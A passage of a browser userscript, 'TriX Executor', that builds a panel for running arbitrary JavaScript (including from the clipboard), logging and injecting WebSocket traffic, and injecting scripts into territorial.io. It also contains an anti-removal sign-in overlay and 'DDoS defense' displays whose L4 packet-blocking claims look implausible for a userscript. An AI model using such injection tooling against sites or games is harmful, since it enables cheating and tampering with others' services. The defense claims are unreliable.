    .card-title { font-weight: 600; margin-bottom: 5px; color: #818cf8; } .card-description { font-size: 12px; color: rgba(255,255,255,0.7); }
    .settings-group { margin-bottom: 20px; } .settings-label { display: flex; align-items: center; margin-bottom: 8px; font-weight: 600; font-size: 13px; } .settings-checkbox { margin-right: 10px; width: 16px; height: 16px; accent-color: #4f46e5; }
    .settings-input, .settings-select { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; padding: 10px; color: #fff; font-size: 12px; outline: none; box-sizing: border-box; }
    .notification-container { position: fixed; bottom: 20px; right: 20px; z-index: 2147483647; display: flex; flex-direction: column; gap: 10px; align-items: flex-end; contain: layout; min-height: 0; }
    .notification { display: flex; align-items: center; background: linear-gradient(135deg, #2d2d44 0%, #1e1e2e 100%); border-left: 4px solid #10b981; color: #fff; padding: 12px 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-size: 13px; max-width: 350px; word-break: break-all; opacity: 0; transform: translateX(100%); transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94); will-change: transform, opacity; contain: layout; }
    .notification.show { opacity: 1; transform: translateX(0); }
    .minimized-icon { position: fixed; width: 50px; height: 50px; background-color: #1e1e2e; border: 3px solid #4f46e5; border-radius: 12px; cursor: pointer; z-index: 999999; transition: all 0.2s ease; box-shadow: 0 8px 25px rgba(0,0,0,0.3); display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: bold; color: #818cf8; user-select: none; }
    .minimized-icon:hover { transform: scale(1.05); box-shadow: 0 12px 35px rgba(79,70,229,0.4); }
    .network-view-content { margin-top: 15px; height: calc(100% - 50px); display: flex; flex-direction: column; }
    .packet-log { height: 100%; overflow-y: auto; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; }
    .log-item { padding: 4px; border-bottom: 1px solid rgba(255,255,255,0.1); word-break: break-all; } .log-item.send { color: #6ee7b7; } .log-item.receive { color: #f0abfc; }
    .storage-table { display: grid; grid-template-columns: 150px 1fr auto; gap: 10px; align-items: center; font-size: 12px; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1); }
    .storage-key { color: #f0abfc; font-weight: bold; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; } .storage-value { color: #6ee7b7; word-break: break-all; }
    .trix-content::-webkit-scrollbar, .script-cards::-webkit-scrollbar, .packet-log::-webkit-scrollbar { width: 8px; }
    .trix-content::-webkit-scrollbar-track, .script-cards::-webkit-scrollbar-track, .packet-log::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); border-radius: 4px; }
    .trix-content::-webkit-scrollbar-thumb, .script-cards::-webkit-scrollbar-thumb, .packet-log::-webkit-scrollbar-thumb { background: rgba(79,70,229,0.6); border-radius: 4px; }
    #suggestion-box { margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); text-align: center; }
    .advert-toast { display: flex; gap: 15px; align-items: center; background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%); border-left-color: #7c3aed; }
    .advert-img { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; }
    .advert-content { flex-grow: 1; } .advert-content p { font-size: 13px; margin: 0 0 10px 0; }
    .trix-modal-backdrop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
    .trix-modal-backdrop.visible { display: flex; }
    .trix-modal-section {
      width: 100%;
      box-sizing: border-box;
      margin-bottom: 15px;
      padding: 10px;
      background: rgba(0,0,0,0.2);
      border-radius: 8px;
    }
    .trix-modal-content { background: #1e1e2e; border: 1px solid #4f46e5; width: 90%; max-width: 450px; border-radius: 12px; display: flex; flex-direction: column; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
    .trix-modal-header { padding: 15px; border-bottom: 1px solid #4f46e5; font-size: 16px; font-weight: 600; } .trix-modal-body { padding: 20px; }
    .trix-modal-footer { padding: 15px; border-top: 1px solid #4f46e5; display: flex; justify-content: flex-end; gap: 10px; }
    #update-reminder { background: rgba(251, 191, 36, 0.1); border: 1px solid #fbbf24; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
    #cloud-notice { background: rgba(79, 70, 229, 0.1); border: 1px solid #4f46e5; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; text-align: center; }
    /* watermark to assert ownership */
    .trix-watermark { position: absolute; left: 12px; bottom: 12px; font-size: 11px; color: rgba(255,255,255,0.12); pointer-events: none; user-select: none; }
    /* Sign-In Modal Styles */
    #trix-signin-modal { z-index: 1000001; }
    #trix-signin-modal .trix-modal-content { max-width: 350px; }
    #trix-signin-modal .trix-modal-body { text-align: center; }
    .trix-signin-option { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 15px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s ease; }
    .trix-signin-option:hover { background: rgba(79,70,229,0.2); border-color: #4f46e5; transform: translateY(-2px); }
    .trix-signin-option-title { font-weight: 600; font-size: 14px; color: #a5b4fc; margin-bottom: 4px; }
    .trix-signin-option-desc { font-size: 12px; color: rgba(255,255,255,0.6); }
    /* Loading Modal */
    #trix-loading-modal { z-index: 1000002; }
    #trix-loading-modal .trix-modal-content { background: transparent; border: none; box-shadow: none; max-width: 300px; }
    #trix-loading-modal .trix-modal-header { border: none; padding: 0; font-size: 14px; }
    #trix-loading-modal .trix-modal-body { padding: 20px 0; text-align: center; }
    .trix-loading-spinner { display: inline-block; }
    .trix-loading-spinner svg { width: 100px; height: 60px; }
    .trix-loading-spinner .path { stroke: #00ffff; stroke-width: 6; stroke-linejoin: round; stroke-linecap: round; stroke-dasharray: 193.904983521; fill: none; animation: trix-load 4s linear infinite, trix-color 3s linear infinite; }
    @keyframes trix-load { from { stroke-dashoffset: 775.6199340820312; } to { stroke-dashoffset: 0; } }
    @keyframes trix-color { 0% { stroke: #00ffff; } 33% { stroke: #ffff00; } 66% { stroke: #ff00ff; } 100% { stroke: #00ffff; } }
    /* Account Modal */
    #trix-account-modal { z-index: 1000003; }
    #trix-account-modal .trix-modal-content { max-width: 450px; }
    .trix-account-info { display: flex; flex-direction: column; align-items: center; gap: 15px; }
    .trix-account-avatar { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4f46e5; background: rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center; font-size: 40px; cursor: pointer; position: relative; overflow: hidden; }
    .trix-account-avatar img { width: 100%; height: 100%; object-fit: cover; }
    .trix-account-avatar::after { content: '🖼️'; position: absolute; background: rgba(0,0,0,0.7); width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.2s; }
    .trix-account-avatar:hover::after { opacity: 1; }
    .trix-account-field { width: 100%; }
    .trix-account-field label { display: block; font-size: 12px; color: #a5b4fc; margin-bottom: 4px; font-weight: 600; }
    .trix-account-field input { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; padding: 8px 12px; color: #fff; font-size: 12px; box-sizing: border-box; }
    .trix-account-field input:focus { outline: none; border-color: #4f46e5; background: rgba(79,70,229,0.1); }
    /* Toggle Switch */
    .trix-toggle-wrapper { display: flex; align-items: center; gap: 10px; margin: 15px 0; }
    .trix-toggle-label { font-size: 12px; color: rgba(255,255,255,0.8); }
    .trix-toggle { position: relative; display: inline-block; width: 40px; height: 22px; }
    .trix-toggle input { opacity: 0; width: 0; height: 0; }
    .trix-toggle-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #4b5563; transition: 0.3s; border-radius: 22px; }
    .trix-toggle-slider:before { position: absolute; content: ''; height: 18px; width: 18px; left: 2px; bottom: 2px; background-color: white; transition: 0.3s; border-radius: 50%; }
    .trix-toggle input:checked + .trix-toggle-slider { background-color: #4f46e5; }
    .trix-toggle input:checked + .trix-toggle-slider:before { transform: translateX(18px); }
    /* Password Toggle */
    .trix-password-field-wrapper { position: relative; display: flex; align-items: center; }
    .trix-password-toggle-icon { position: absolute; right: 12px; cursor: pointer; font-size: 16px; user-select: none; color: rgba(255,255,255,0.6); transition: color 0.2s; padding: 4px 8px; }
    .trix-password-toggle-icon:hover { color: rgba(255,255,255,0.9); }
    /* Cloud Tab Loading Spinner */
    #cloud-spinner-wrapper { position: relative; width: 100%; height: 100%; display: none; align-items: center; justify-content: center; }
    #cloud-spinner-wrapper.active { display: flex; }
    .cloud-spinner { position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; flex-direction: column; }
    .cloud-loading-container { opacity: 0.8; width: 40px; height: 40px; position: relative; }
    .cloud-loading-container .ball { background-color: rgba(0, 0, 0, 0); border: 5px solid rgba(79, 70, 229, 0.9); opacity: 0.9; border-top: 5px solid rgba(0, 0, 0, 0); border-left: 5px solid rgba(0, 0, 0, 0); border-radius: 50px; box-shadow: 0 0 35px rgba(79, 70, 229, 0.8); width: 40px; height: 40px; animation: cloud-spin 0.5s infinite linear; }
    .cloud-loading-container .ball-inner { background-color: rgba(0, 0, 0, 0); border: 5px solid rgba(79, 70, 229, 0.9); opacity: 0.9; border-top: 5px solid rgba(0, 0, 0, 0); border-left: 5px solid rgba(0, 0, 0, 0); border-radius: 50px; box-shadow: 0 0 15px rgba(79, 70, 229, 0.8); width: 20px; height: 20px; margin: 10px 0 0 10px; position: relative; top: -50px; animation: cloud-spin 0.5s infinite reverse linear; }
    .ball-text { color: rgba(79, 70, 229, 0.9); text-transform: uppercase; text-align: center; opacity: 0.8; font-size: 15px; margin-top: 30px; animation: cloud-pulse 1s infinite alternate ease-in-out; text-shadow: 0 0 35px rgba(79, 70, 229, 0.8), 0 0 35px rgba(79, 70, 229, 0.6); }
    @keyframes cloud-pulse { 0% { opacity: 0.8; } 100% { opacity: 0.4; } }
    @keyframes cloud-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  `;
  const styleSheet = document.createElement("style");
  styleSheet.textContent = styles;
  document.head.appendChild(styleSheet);
  
  // --- UI Creation ---
  function createExecutorPanel() {
    const panel = document.createElement("div"); panel.className = "trix-executor"; panel.innerHTML = ` <div class="trix-header"> <div class="trix-title-area"> <img src="${GM_info.script.icon}" class="trix-icon"> <div class="trix-title">TriX Executor v${CURRENT_VERSION} <span class="revamp-badge">REVAMP</span></div> </div> <div class="trix-header-info"> <div id="trix-conn-status" title="Disconnected"></div> <span id="trix-ping-display">Ping: ---</span> <span id="trix-fps-display">FPS: --</span> </div> <div class="trix-controls"> <button class="trix-btn minimize-btn" title="Minimize">−</button> <button class="trix-btn maximize-btn" title="Maximize">□</button> <button class="trix-btn close-btn" title="Close">×</button> </div> </div> <div class="trix-body"> <div class="trix-sidebar"> <div class="sidebar-nav"> <div class="sidebar-item active" data-tab="home">🏠 Home</div> <div class="sidebar-item" data-tab="main">⚡ Main</div> <div class="sidebar-item" data-tab="network">📡 Network</div> <div class="sidebar-item" data-tab="cloud">☁ Cloud</div> <div class="sidebar-item" data-tab="more">🌟 More from TriX</div> <div class="sidebar-item" data-tab="files">📁 Files</div> <div class="sidebar-item" data-tab="settings">⚙ Settings</div> </div> <div class="sidebar-footer"> <div id="trix-user-profile-container"> <div id="trix-user-profile" style="cursor:pointer;"> <img id="trix-user-pfp" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNhNWY0ZmMiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMjAgMjF2LTJhNCA0IDAgMCAwLTQtNEg4YTQgNCAwIDAgMC00IDR2MiI+PC9wYXRoPjxjaXJjbGUgY3g9IjEyIiBjeT0iNyIgcj0iNCI+PC9jaXJjbGU+PC9zdmc+"> <span id="trix-user-name">Guest</span> </div> <button id="trix-account-settings-btn" class="exec-btn" style="padding:5px 8px;font-size:12px;display:none" title="Account Settings">⚙️</button> </div> <button id="trix-signin-btn" class="exec-btn" style="width:100%;padding:8px;font-size:11px">Sign In</button> </div> </div> <div class="trix-content"> ${createHomeContent()} ${createMainContent()} ${createNetworkContent()} ${createCloudContent()} ${createMoreFromTrixContent()} ${createFilesContent()} ${createSettingsContent()}<div class="trix-watermark">© 2025 Painsel - Proprietary</div> </div> </div> `;
    document.body.appendChild(panel);
 
    // Logic to show/hide Inject button based on hostname
    const injectButton = document.getElementById('inject-territorial-scripts-btn');
    if (injectButton && window.location.hostname.includes('territorial.io')) {
        injectButton.style.display = 'block';
    }
    return panel;
  }
  
  // --- MINIFIED HELPER FUNCTIONS ---
  function showNotification(m, t="success", d=5000) { const c = document.querySelector('.notification-container') || document.createElement('div'); if (!c.className) { c.className = 'notification-container'; document.body.appendChild(c); } const n = document.createElement("div"); n.className="notification"; n.innerHTML=m; if(t==="error") n.style.borderLeftColor = "#ef4444"; if(t==="warning") n.style.borderLeftColor = "#f59e0b"; c.appendChild(n); setTimeout(()=>n.classList.add("show"),10); setTimeout(()=>{n.classList.remove("show"); setTimeout(()=>n.remove(),400)},d); }
  function createHomeContent(){return`<div class="content-section active" id="home-content"><h2>Script Store</h2><input type="text" class="search-input" placeholder="Search saved scripts..." id="script-search"><div class="script-cards" id="saved-scripts"></div></div>`}
  function createMainContent(){
    return`<div class="content-section" id="main-content"><h2>Live JS Executor</h2><div class="script-tabs" id="script-tabs"></div><textarea class="script-input" placeholder="Enter Script Here..." id="script-editor"></textarea><div class="executor-buttons"><button class="exec-btn" id="execute-btn">Execute</button><button class="exec-btn secondary" id="execute-clipboard-btn">Execute Clipboard</button><button class="exec-btn success" id="save-script-btn">Save Script</button><button class="exec-btn success" id="inject-territorial-scripts-btn" style="display:none;">Inject Territorial.io Scripts</button></div></div>`}
 
  function renderSignInOverlay() {
    const overlay = document.createElement('div');
    overlay.id = 'trix-signin-overlay';
    overlay.className = 'trix-overlay';
    overlay.style.cssText = `
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.9);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      color: white;
      text-align: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    `;
    overlay.innerHTML = `
      <img src="${GM_info.script.icon}" style="width:64px;height:64px;margin-bottom:10px;">
      <h2>TriX Executor</h2>
      <p style="color:#fbbf24;font-size:1.1em;margin-bottom:15px;">Please sign in to use TriX Executor.</p>
      <button class="exec-btn success" id="signin-prompt-btn" style="margin-top:15px;">Sign In</button>
    `;
    document.querySelector('.trix-body').appendChild(overlay);
 
    // Add event listener for the sign-in button
    overlay.querySelector('#signin-prompt-btn').addEventListener('click', showSignInModal);
 
    // Implement security measure to prevent deletion via DevTools
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList') {
          const removedNodes = Array.from(mutation.removedNodes);
          if (removedNodes.some(node => node.id === 'trix-signin-overlay')) {
            // Overlay was removed, re-render it
            renderSignInOverlay();
          }
        }
      });
    });
 
    // Observe the parent element for changes
    const trixBody = document.querySelector('.trix-body');
    if (trixBody) {
      observer.observe(trixBody, { childList: true });
      // Store the observer to disconnect it later on successful sign-in
      overlay._mutationObserver = observer;
    }
 
    // Initially hide the overlay if currentUser exists
    if (currentUser) {
      overlay.style.display = 'none';
    }
  }
 
 
  function createCloudContent(){return`<div class="content-section" id="cloud-content"><h2>GreasyFork Scripts</h2><div id="cloud-notice"><b>NOTICE:</b> You can copy the code of the GreasyFork script you want to execute and then paste it in TriX Executor!</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;align-items:center">
      <input type="text" class="search-input" placeholder="Search GreasyFork..." id="greasyfork-search" list="gf-suggestions" style="flex:1;min-width:180px">
      <input type="text" class="search-input" placeholder="Author (optional)" id="greasyfork-author" style="width:180px">
      <input type="text" class="search-input" placeholder="Tags (comma-separated)" id="greasyfork-tags" style="width:180px">
      <select id="greasyfork-sort" class="settings-select" style="width:180px">
        <option value="">Relevance</option>
        <option value="daily_installs">Daily installs</option>
        <option value="total_installs">Total installs</option>
        <option value="ratings">Ratings</option>
        <option value="created">Created date</option>
        <option value="updated" selected>Updated date</option>
        <option value="name">Name</option>
      </select>
      <button id="greasyfork-search-btn" class="exec-btn" style="white-space:nowrap">Search</button>
    </div>
    <datalist id="gf-suggestions"><option value="territorial.io"></option><option value="openfront.io"></option><option value="Discord"></option><option value="Uhmegle"></option></datalist>
    <div class="script-cards" id="cloud-results"></div></div>`}
  function createFilesContent(){return`<div class="content-section" id="files-content"><h2>File Explorer</h2><p style="font-size:12px; color:#ccc; margin-bottom:10px">A read-only view of data this script has stored.</p><div class="script-cards" id="file-explorer-view"></div></div>`}
  function createNetworkContent(){return`<div class="content-section" id="network-content"><div class="network-tabs"><div class="network-tab active" data-net-tab="logger">Logger</div><div class="network-tab" data-net-tab="injector">Injector</div><div class="network-tab" data-net-tab="ws_client">WS Client</div><div class="network-tab" data-net-tab="storage">Storage</div></div><div class="network-view-content"></div></div>`}
  function createMoreFromTrixContent(){return`<div class="content-section" id="more-content"><h2>🌟 More from TriX</h2><p style="font-size:12px; color:rgba(255,255,255,0.7); margin-bottom:15px">Explore other powerful scripts by Painsel to enhance your experience.</p><div class="script-cards" id="more-scripts-container"></div></div>`}
  function createSettingsContent(){return`<div class="content-section" id="settings-content"></div>`}
  function renderSettingsTab(){
    const s=document.getElementById('settings-content');
    if(!s) return;
    let updateHTML='';
    if(shouldShowUpdateReminder){
      updateHTML=`<div id="update-reminder"><p>You are using an older version of TriX Executor! Please update for the best experience.</p><button id="update-now-reminder" class="exec-btn success" style="width:100%">Update Now!</button></div>`
    }
    const st=settings;
    s.innerHTML=`<h2>Settings</h2>
      <div class="settings-group"><label class="settings-label"><input type="checkbox" class="settings-checkbox" id="show-on-all-sites" ${st.showOnAllSites?"checked":""}>Show on All Sites</label></div>
      <div class="settings-group"><label class="settings-label"><input type="checkbox" class="settings-checkbox" id="socket-toasts" ${st.socketToasts?"checked":""}>Socket Connection Toasts</label></div>
      <div class="settings-group"><label class="settings-label"><input type="checkbox" class="settings-checkbox" id="propaganda-toasts" ${st.propagandaToasts?"checked":""}>Propaganda Blocked Toasts</label></div>
      <div class="settings-group"><label class="settings-label"><input type="checkbox" class="settings-checkbox" id="block-propaganda" ${st.blockPropaganda?"checked":""}>Block Propaganda Popups (for territorial.io)</label></div>
      <div class="settings-group"><label class="settings-label"><input type="checkbox" class="settings-checkbox" id="anti-scam" ${st.antiScam?"checked":""}>Anti-Scam Protection</label></div>
      <div class="settings-group"><label class="settings-label"><input type="checkbox" class="settings-checkbox" id="show-ad" ${st.showAd?"checked":""}>Show TrixMusic Advertisement</label></div>
      <div class="settings-group" style="margin-top:15px;padding:12px;border:1px solid rgba(255,255,255,0.15);border-radius:8px;background:rgba(79,70,229,0.1);">
        <h3 style="margin:0 0 8px 0;font-size:13px">🛡️ DDoS Mitigation</h3>
        <label class="settings-label" style="margin-bottom:10px"><input type="checkbox" class="settings-checkbox" id="ddos-mitigation" ${st.ddosMitigation?"checked":""}>Enable DDoS Detection</label>
        <label class="settings-label" style="margin-bottom:10px"><input type="checkbox" class="settings-checkbox" id="auto-reconnect" ${st.autoReconnect?"checked":""}>Auto-Reconnect on Disconnect</label>
        <p style="margin:8px 0;color:rgba(255,255,255,0.7);font-size:11px">Monitors for unusual packet volume and connection anomalies. Export reports to identify attacks.</p>
        <div id="ddos-severity-display" style="margin:10px 0;padding:8px;background:rgba(0,0,0,0.3);border-radius:4px;font-size:11px;color:rgba(255,255,255,0.8)"></div>
        <div style="display:flex;gap:8px;margin-top:8px">
          <button id="export-ddos-report-btn" class="exec-btn success" style="flex:1;font-size:11px">📊 Export Report</button>
          <button id="show-attack-analysis-btn" class="exec-btn" style="flex:1;font-size:11px">📈 Analysis</button>
        </div>
        <button id="show-defense-status-btn" class="exec-btn secondary" style="width:100%;margin-top:8px;font-size:11px">🔒 Defense Status</button>
      </div>
      <div class="settings-group" style="margin-top:10px;padding:12px;border:1px solid rgba(255,255,255,0.06);border-radius:8px;background:rgba(0,0,0,0.12);">
        <h3 style="margin:0 0 8px 0;font-size:13px">Licensing & Terms</h3>
        <p style="margin:0 0 8px 0;color:rgba(255,255,255,0.8);font-size:12px">This software is proprietary. Use is subject to the license and terms maintained by the author. Unauthorized distribution is prohibited.</p>
        <a id="trix-terms-link" href="https://example.com/trix-executor-terms" target="_blank" style="font-size:12px;color:#a5b4fc">View Terms & License</a>
      </div>
      <div id="suggestion-box"><p>Have any suggestions? Send a message to Painsel!</p><button id="submit-suggestion-btn" class="exec-btn">Submit a Suggestion</button></div>
      ${updateHTML}`;
 
    // Explicitly ensure the checkbox elements reflect the settings object
    const elShowAd = s.querySelector('#show-ad'); if(elShowAd) elShowAd.checked = !!st.showAd;
    const elShowOnAll = s.querySelector('#show-on-all-sites'); if(elShowOnAll) elShowOnAll.checked = !!st.showOnAllSites;
    const elSocketToasts = s.querySelector('#socket-toasts'); if(elSocketToasts) elSocketToasts.checked = !!st.socketToasts;
    const elPropagandaToasts = s.querySelector('#propaganda-toasts'); if(elPropagandaToasts) elPropagandaToasts.checked = !!st.propagandaToasts;
    const elBlockPropaganda = s.querySelector('#block-propaganda'); if(elBlockPropaganda) elBlockPropaganda.checked = !!st.blockPropaganda;
    const elAntiScam = s.querySelector('#anti-scam'); if(elAntiScam) elAntiScam.checked = !!st.antiScam;
    const elDdosMitigation = s.querySelector('#ddos-mitigation'); if(elDdosMitigation) elDdosMitigation.checked = !!st.ddosMitigation;
    const elAutoReconnect = s.querySelector('#auto-reconnect'); if(elAutoReconnect) elAutoReconnect.checked = !!st.autoReconnect;
    
    // Update DDoS severity display
    const severityDisplay = s.querySelector('#ddos-severity-display');
    if (severityDisplay) {
      const severity = ddosReport.calculateSeverity();
      severityDisplay.innerHTML = `<strong>${severity.message}</strong><br/>
        <small>Errors: ${ddosReport.anomalies.filter(a => a.type === 'CONNECTION_ERROR').length} | 
        Duration: ${Math.round((Date.now() - ddosReport.startTime) / 1000)}s</small>`;
    }
    
    // Event listeners for DDoS report export
    const exportBtn = s.querySelector('#export-ddos-report-btn');
    if (exportBtn) {
      exportBtn.addEventListener('click', () => {
        ddosReport.exportReport();
        showNotification('DDoS report exported successfully!', 'success');
      });
    }
    
    // Event listener for attack analysis
    const analysisBtn = s.querySelector('#show-attack-analysis-btn');
    if (analysisBtn) {
      analysisBtn.addEventListener('click', () => {
        const patterns = ddosReport.analyzePatterns();
        const waves = patterns.attackWaves;
        const severity = ddosReport.calculateSeverity();
        
        let analysisHTML = `<h3>📊 Attack Analysis Report</h3>
          <p style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;margin:8px 0">
            <strong>Attack Type:</strong> ${patterns.attackType}<br/>
            <strong>Threat Level:</strong> ${severity.message}<br/>
            <strong>Risk Score:</strong> ${severity.score}/100
          </p>
          
          <p><strong>📈 Error Statistics:</strong></p>
          <p>Total Errors: ${patterns.totalErrors} | Consecutive Max: ${patterns.consecutiveFailures}</p>
          <p>Intervals: Min ${Math.round(patterns.errorIntervals.min)}ms | Avg ${Math.round(patterns.errorIntervals.avg)}ms | Max ${Math.round(patterns.errorIntervals.max)}ms</p>
          
          <p><strong>🔍 Attack Layer Breakdown:</strong></p>
          <p>L4 (UDP/Transport): ${severity.l4Attacks} events | L7 (HTTP/Application): ${severity.l7Attacks} events</p>`;
        
        if (waves.length > 0) {
          analysisHTML += '<p><strong>⚔️ Attack Waves Detected:</strong> ' + waves.length + '</p><ul style="margin:8px 0;padding-left:20px">';
          waves.forEach((wave, i) => {
            const duration = Math.round(wave.durationMs / 1000);
            analysisHTML += `<li>Wave ${i + 1}: ${wave.errorCount} errors over ${duration}s (${new Date(wave.start).toLocaleTimeString()})</li>`;
          });
          analysisHTML += '</ul>';
        }
        
        // Add recommendations
        analysisHTML += '<p style="margin-top:12px;padding:8px;background:rgba(100,150,255,0.1);border-left:3px solid #6496ff;font-size:11px">';
        if (patterns.attackType.includes('MULTI_LAYER')) {
          analysisHTML += '<strong>⚠️ Multi-layer Attack Detected:</strong> Attacker using both L4 (UDP floods) and L7 (HTTP floods). Recommend: DDoS mitigation service + load balancing.';
        } else if (patterns.attackType.includes('L4')) {
          analysisHTML += '<strong>🔴 L4 Attack (UDP Flood):</strong> Network layer overwhelmed. Recommend: Rate limiting, packet filtering at edge.';
        } else if (patterns.attackType.includes('L7')) {
          analysisHTML += '<strong>🟠 L7 Attack (HTTP Flood):</strong> Application layer overwhelmed. Recommend: WAF, request validation, CAPTCHA.';
        }
        analysisHTML += '</p>';
        
        const modal = document.createElement('div');
        modal.className = 'trix-modal-backdrop visible';
        modal.innerHTML = `<div class="trix-modal-content">
          <div class="trix-modal-header">DDoS Attack Analysis Report</div>
          <div class="trix-modal-body" style="font-size:12px;max-height:500px;overflow-y:auto">${analysisHTML}</div>
          <div class="trix-modal-footer">
            <button id="close-analysis-modal" class="exec-btn secondary">Close</button>
          </div>
        </div>`;
        
        document.body.appendChild(modal);
        modal.querySelector('#close-analysis-modal').addEventListener('click', () => modal.remove());
        modal.addEventListener('click', e => { if (e.target === modal) modal.remove(); });
      });
    }
    
    // Event listener for defense status
    const defenseBtn = s.querySelector('#show-defense-status-btn');
    if (defenseBtn) {
      defenseBtn.addEventListener('click', () => {
        const status = defenseSystem.getDefenseStatus();
        const blockStats = defenseSystem.getBlockingStats();
        const l4 = status.l4;
        const l7 = status.l7;
        const pool = status.pool;
        
        const l4Status = l4.isUnderAttack ? '🔴' : '🟢';
        const l7Status = l7.isUnderAttack ? '🔴' : '🟢';
        
        let statusHTML = `<h3>🔒 Active Defense Status</h3>
          <p style="font-size:11px;color:rgba(255,255,255,0.7)">Last Updated: ${new Date(status.timestamp).toLocaleTimeString()}</p>
          
          <div style="background:rgba(255,100,100,0.15);border-left:3px solid #ff6b6b;padding:8px;margin:8px 0;border-radius:4px;font-size:11px">
            <strong>Defense Threat Level:</strong> ${blockStats.defense_active ? blockStats.threat_level : 'NORMAL'} ${blockStats.defense_active ? '⚡' : '✓'}
          </div>
          
          <p><strong>L4 Defense (Transport Layer / UDP)</strong></p>
          <div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;margin:8px 0;font-size:11px">
            <p>${l4Status} PPS: ${l4.currentPPS} / ${l4.threshold} (${l4.utilization}% utilization)</p>
            <p style="color:${blockStats.l4.isBlocking ? '#ff6b6b' : '#51cf66'};margin:4px 0">
              🚫 Blocking Rate: ${blockStats.l4.avgBlockRate} | Blocked: ${blockStats.l4.totalBlocked} packets
            </p>
            <div style="background:rgba(255,255,255,0.1);height:8px;border-radius:2px;margin:4px 0;overflow:hidden">
              <div style="background:${l4.utilization > 80 ? '#ff6b6b' : l4.utilization > 50 ? '#ffd93d' : '#51cf66'};width:${l4.utilization}%;height:100%;transition:width 0.3s"></div>
            </div>
            ${l4.isUnderAttack ? '<p style="color:#ff6b6b">⚠️ <strong>HIGH PACKET RATE</strong> - UDP flood defense ACTIVE - Packets being dropped</p>' : '<p style="color:#51cf66">✓ Normal packet rate - No blocking</p>'}
          </div>
          
          <p style="margin-top:12px"><strong>L7 Defense (Application Layer / HTTP)</strong></p>
          <div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;margin:8px 0;font-size:11px">
            <p>${l7Status} RPS: ${l7.currentRPS} / ${l7.threshold} (${l7.utilization}% utilization)</p>
            <p>Concurrent: ${l7.concurrentRequests} / ${l7.maxConcurrent} (${l7.concurrencyUtilization}%) | Queued: ${l7.queuedRequests}</p>
            <p style="color:${blockStats.l7.isBlocking ? '#ff6b6b' : '#51cf66'};margin:4px 0">
              🚫 Blocking Rate: ${blockStats.l7.avgBlockRate} | Blocked: ${blockStats.l7.totalBlocked} requests
            </p>
            <div style="background:rgba(255,255,255,0.1);height:8px;border-radius:2px;margin:4px 0;overflow:hidden">
              <div style="background:${l7.utilization > 80 ? '#ff6b6b' : l7.utilization > 50 ? '#ffd93d' : '#51cf66'};width:${l7.utilization}%;height:100%;transition:width 0.3s"></div>
            </div>
            ${l7.isUnderAttack ? '<p style="color:#ff6b6b">⚠️ <strong>HIGH REQUEST RATE</strong> - HTTP flood defense ACTIVE - Requests queued/blocked</p>' : '<p style="color:#51cf66">✓ Normal request rate - No blocking</p>'}
          </div>
          
          <p style="margin-top:12px"><strong>Connection Pool & Queuing</strong></p>
          <div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;margin:8px 0;font-size:11px">
            <p>Active: ${pool.active} / ${pool.max} | Waiting: ${pool.waiting} requests</p>
            <p style="color:#6b96ff">Buffered Requests: ${l7.queuedRequests} (being processed in order)</p>
            <div style="background:rgba(255,255,255,0.1);height:6px;border-radius:2px;margin:4px 0;overflow:hidden">
              <div style="background:#6b96ff;width:${pool.utilization}%;height:100%;transition:width 0.3s"></div>
            </div>
            <p style="font-size:10px;color:rgba(255,255,255,0.6);margin-top:4px">Graceful degradation: Queued requests processed when capacity available</p>
          </div>
          
          <p style="margin-top:12px;padding:8px;background:rgba(100,200,100,0.15);border-left:3px solid #51cf66;font-size:11px">
            <strong>🛡️ Defense Strategy:</strong> Multi-layer rate limiting active. 
            ${defenseSystem.l4Defense.enabled && defenseSystem.l7Defense.enabled ? 'Both L4 and L7 defenses ENABLED.' : 'Partial defenses active.'}
